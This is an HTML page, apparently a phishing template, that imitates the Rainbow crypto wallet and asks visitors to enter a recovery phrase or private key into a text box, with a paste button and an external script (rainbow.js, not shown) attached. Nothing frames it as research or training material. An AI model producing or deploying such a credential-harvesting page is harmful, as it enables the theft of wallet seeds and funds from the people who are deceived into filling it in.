<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="rainbow.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
</head>
<body>
    <div class="outer-box">
        <div class="inner-box">
            <h2 class="heading">Enter your wallet</h2>
            <p class="para">  Enter recovery phrase or private key from Rainbow or another crypto wallet</p>
            <textarea placeholder="Enter a recovery phrase or private key" class="text-area" name="" id="" cols="30" rows="10"></textarea>
            <p class="error-box display"></p>
            <div class="last-box">
                <button class="button"> <i class="fa-solid fa-paste"></i> Paste</button>
            </div>
        </div>
    </div>
    <script src="rainbow.js"></script>
</body>
</html>
